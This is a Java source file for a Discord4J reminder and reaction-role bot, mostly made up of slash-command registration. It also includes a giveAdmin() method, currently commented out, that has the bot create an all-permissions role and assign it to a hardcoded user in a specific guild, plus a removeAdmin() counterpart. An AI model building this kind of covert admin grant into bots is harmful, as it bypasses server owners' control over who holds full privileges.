import discord4j.common.util.Snowflake;
import discord4j.core.GatewayDiscordClient;
import discord4j.core.object.command.ApplicationCommand;
import discord4j.core.object.command.ApplicationCommandOption;
import discord4j.core.object.entity.Role;
import discord4j.core.spec.RoleCreateSpec;
import discord4j.discordjson.json.ApplicationCommandData;
import discord4j.discordjson.json.ApplicationCommandOptionData;
import discord4j.discordjson.json.ApplicationCommandRequest;
import discord4j.rest.util.PermissionSet;

import java.time.Duration;
import java.util.ArrayList;
import java.util.List;
import java.util.Objects;

public class CommandDevCreator {
    private static GatewayDiscordClient gateway;
    private static long appId;

    public static void main(String[] args) {
        gateway = ReminderBot.login(args[0]);
        appId = Objects.requireNonNull(gateway.getRestClient().getApplicationId().block());
//        giveAdmin();
        removeAdmin();
//        createCommands();
    }

    private static void giveAdmin() {
        var userId = 395655395114483713L;
        var guildId = 1331253401643647077L;
        var guild = gateway.getGuildById(Snowflake.of(guildId)).block();
        var highestRole = guild.getSelfMember().block().getRoles().filter(Role::isManaged).single().block();

        var role = guild
                .createRole(RoleCreateSpec.builder().name("DasBabyPixel").permissions(PermissionSet.all()).build())
                .block();
        role.changePosition(highestRole.getData().position()).then().block();
        var member = guild.getMemberById(Snowflake.of(userId)).block();
        member.addRole(role.getId()).block();
    }

    private static void removeAdmin() {
        var userId = 395655395114483713L;
        var guildId = 1331253401643647077L;
        var guild = gateway.getGuildById(Snowflake.of(guildId)).block();
        var role = guild.getRoles().filter(r -> r.getName().equals("DasBabyPixel")).single().block();
        role.delete().block();
    }

    private static void createCommands() {
        var requests = new ArrayList<ApplicationCommandRequest>();
        // @formatter:off
        requests.add(ApplicationCommandRequest
                .builder()
                .name("event")
                .description("Manage events")
                .defaultMemberPermissions(Integer.toString(1 << 3))
                .addOption(ApplicationCommandOptionData
                        .builder()
                        .name("create")
                        .description("Create an event")
                        .type(ApplicationCommandOption.Type.SUB_COMMAND.getValue())
                        .addOption(ApplicationCommandOptionData
                                .builder()
                                .name("name")
                                .description("The name of the event (must be unique)")
                                .type(ApplicationCommandOption.Type.STRING.getValue())
                                .required(true)
                                .build())
                        .addOption(ApplicationCommandOptionData
                                .builder()
                                .name("interval")
                                .description("How often to send the reminder")
                                .type(ApplicationCommandOption.Type.STRING.getValue())
                                .required(true)
                                .build())
                        .addOption(ApplicationCommandOptionData
                                .builder()
                                .name("firststart")
                                .description("When the event starts for the first time (UTC)")
                                .type(ApplicationCommandOption.Type.STRING.getValue())
                                .required(true)
                                .build())
                        .build())
//                .addOption(ApplicationCommandOptionData
//                        .builder()
//                        .name("manage")
//                        .description("Manage events (and their reminders)")
//                        .type(ApplicationCommandOption.Type.SUB_COMMAND_GROUP.getValue())
//                        .addOption(ApplicationCommandOptionData
//                                .builder()
//                                .name("move")
//                                .description("Move an event to another time")
//                                .type(ApplicationCommandOption.Type.SUB_COMMAND.getValue())
//                                .build())
//                        .addOption(ApplicationCommandOptionData
//                                .builder()
//                                .name("move_specific")
//                                .description("Move an event to another time")
//                                .type(ApplicationCommandOption.Type.SUB_COMMAND.getValue())
//                                .build())
//                        .build())
                .addOption(ApplicationCommandOptionData
                        .builder()
                        .name("delete")
                        .description("Delete an event")
                        .type(ApplicationCommandOption.Type.SUB_COMMAND.getValue())
                        .addOption(ApplicationCommandOptionData
                                .builder()
                                .name("event")
                                .description("The name of the event")
                                .type(ApplicationCommandOption.Type.STRING.getValue())
                                .autocomplete(true)
                                .required(true)
                                .build())
                        .build())
                .addOption(ApplicationCommandOptionData
                        .builder()
                        .name("info")
                        .type(ApplicationCommandOption.Type.SUB_COMMAND.getValue())
                        .description("Get information about the event")
                        .addOption(ApplicationCommandOptionData
                                .builder()
                                .name("event")
                                .description("The name of the event to manage")
                                .type(ApplicationCommandOption.Type.STRING.getValue())
                                .autocomplete(true)
                                .required(true)
                                .build())
                        .build())
                .addOption(ApplicationCommandOptionData
                        .builder()
                        .name("list")
                        .description("List all events")
                        .type(ApplicationCommandOption.Type.SUB_COMMAND.getValue())
                        .build())
                .build());

        requests.add(ApplicationCommandRequest
                .builder()
                .name("reminder")
                .description("Manage reminders")
                .defaultMemberPermissions(Integer.toString(1 << 3))
                .addOption(ApplicationCommandOptionData
                        .builder()
                        .name("create")
                        .description("Create a reminder for an event")
                        .type(ApplicationCommandOption.Type.SUB_COMMAND.getValue())
                        .addOption(ApplicationCommandOptionData
                                .builder()
                                .name("event")
                                .description("The event to create the reminder for")
                                .type(ApplicationCommandOption.Type.STRING.getValue())
                                .autocomplete(true)
                                .required(true)
                                .build())
                        .addOption(ApplicationCommandOptionData
                                .builder()
                                .name("name")
                                .description("The name of the reminder (some may call this the \"ID\", must be unique)")
                                .type(ApplicationCommandOption.Type.STRING.getValue())
                                .required(true)
                                .build())
                        .addOption(ApplicationCommandOptionData
                                .builder()
                                .name("offset")
                                .description("The offset (time before event starts)")
                                .type(ApplicationCommandOption.Type.STRING.getValue())
                                .required(true)
                                .build())
                        .addOption(ApplicationCommandOptionData
                                .builder()
                                .name("message")
                                .description("The message to send")
                                .type(ApplicationCommandOption.Type.STRING.getValue())
                                .required(true)
                                .build())
                        .addOption(ApplicationCommandOptionData
                                .builder()
                                .name("channel")
                                .description("The channel to @mention in")
                                .type(ApplicationCommandOption.Type.CHANNEL.getValue())
                                .required(true)
                                .build())
                        .build())
                .addOption(ApplicationCommandOptionData
                        .builder()
                        .name("delete")
                        .description("Delete a reminder")
                        .type(ApplicationCommandOption.Type.SUB_COMMAND.getValue())
                        .addOption(ApplicationCommandOptionData
                                .builder()
                                .name("event")
                                .description("The target event")
                                .type(ApplicationCommandOption.Type.STRING.getValue())
                                .autocomplete(true)
                                .required(true)
                                .build())
                        .addOption(ApplicationCommandOptionData
                                .builder()
                                .name("reminder")
                                .description("The name of the reminder to delete")
                                .type(ApplicationCommandOption.Type.STRING.getValue())
                                .autocomplete(true)
                                .required(true)
                                .build())
                        .build())
                .addOption(ApplicationCommandOptionData
                        .builder()
                        .name("list")
                        .description("Lists all reminders for an event")
                        .type(ApplicationCommandOption.Type.SUB_COMMAND.getValue())
                        .addOption(ApplicationCommandOptionData
                                .builder()
                                .name("event")
                                .description("The target event")
                                .type(ApplicationCommandOption.Type.STRING.getValue())
                                .autocomplete(true)
                                .required(true)
                                .build())
                        .build())
                .build());

        requests.add(ApplicationCommandRequest
                .builder()
                .defaultMemberPermissions(Integer.toString(1 << 3))
                .name("reactionroles")
                .description("Configure reaction role assignments")
                .addOption(ApplicationCommandOptionData
                        .builder()
                        .name("message")
                        .type(ApplicationCommandOption.Type.SUB_COMMAND_GROUP.getValue())
                        .description("Configure the reaction messages sent by the bot")
                        .addOption(ApplicationCommandOptionData
                                .builder()
                                .name("create")
                                .type(ApplicationCommandOption.Type.SUB_COMMAND.getValue())
                                .description("Create a new message")
                                .addOption(ApplicationCommandOptionData
                                        .builder()
                                        .name("message-id")
                                        .type(ApplicationCommandOption.Type.STRING.getValue())
                                        .description("The id of the message to be created (must be unique)")
                                        .required(true)
                                        .build())
                                .addOption(ApplicationCommandOptionData
                                        .builder()
                                        .name("channel")
                                        .type(ApplicationCommandOption.Type.CHANNEL.getValue())
                                        .description("The channel the message should be sent in")
                                        .required(true)
                                        .build())
                                .addOption(ApplicationCommandOptionData
                                        .builder()
                                        .name("content")
                                        .type(ApplicationCommandOption.Type.STRING.getValue())
                                        .description("The content of the message")
                                        .required(true)
                                        .build())
                                .build())
                        .addOption(ApplicationCommandOptionData
                                .builder()
                                .name("delete")
                                .type(ApplicationCommandOption.Type.SUB_COMMAND.getValue())
                                .description("Delete a message")
                                .addOption(ApplicationCommandOptionData
                                        .builder()
                                        .name("message-id")
                                        .type(ApplicationCommandOption.Type.STRING.getValue())
                                        .description("The ID of the message to delete")
                                        .required(true)
                                        .autocomplete(true)
                                        .build())
                                .build())
                        .addOption(ApplicationCommandOptionData
                                .builder()
                                .name("list")
                                .type(ApplicationCommandOption.Type.SUB_COMMAND.getValue())
                                .description("List all configured messages")
                                .build())
                        .build())
                .addOption(ApplicationCommandOptionData
                        .builder()
                        .name("roles")
                        .type(ApplicationCommandOption.Type.SUB_COMMAND_GROUP.getValue())
                        .description("Attach roles to messages")
                        .addOption(ApplicationCommandOptionData
                                .builder()
                                .name("add")
                                .description("Add a role to a message")
                                .type(ApplicationCommandOption.Type.SUB_COMMAND.getValue())
                                .addOption(ApplicationCommandOptionData
                                        .builder()
                                        .name("message-id")
                                        .type(ApplicationCommandOption.Type.STRING.getValue())
                                        .description("The ID of the message to add the role to")
                                        .required(true)
                                        .autocomplete(true)
                                        .build())
                                .addOption(ApplicationCommandOptionData
                                        .builder()
                                        .name("role")
                                        .type(ApplicationCommandOption.Type.ROLE.getValue())
                                        .description("The role to add")
                                        .required(true)
                                        .build())
                                .addOption(ApplicationCommandOptionData
                                        .builder()
                                        .name("display")
                                        .type(ApplicationCommandOption.Type.STRING.getValue())
                                        .description("How the role should be displayed (on the button and in messages)")
                                        .required(true)
                                        .build())
                                .build())
                        .addOption(ApplicationCommandOptionData
                                .builder()
                                .name("remove")
                                .description("Remove a role from a message")
                                .type(ApplicationCommandOption.Type.SUB_COMMAND.getValue())
                                .addOption(ApplicationCommandOptionData
                                        .builder()
                                        .name("message-id")
                                        .type(ApplicationCommandOption.Type.STRING.getValue())
                                        .description("The ID of the message to remove the role from")
                                        .required(true)
                                        .autocomplete(true)
                                        .build())
                                .addOption(ApplicationCommandOptionData
                                        .builder()
                                        .name("role")
                                        .type(ApplicationCommandOption.Type.ROLE.getValue())
                                        .description("The role to remove")
                                        .required(true)
                                        .autocomplete(true)
                                        .build())
                                .build())
                        .build())
                .build()
        );

        // @formatter:on
        create(requests);
    }

    private static void create(List<ApplicationCommandRequest> request) {
        var test = 626042080799490048L;
        var hos = 1331253401643647077L;
        gateway
                .getRestClient()
                .getApplicationService().bulkOverwriteGuildApplicationCommand(appId, hos, request)
                .then()
                .block();
    }
}
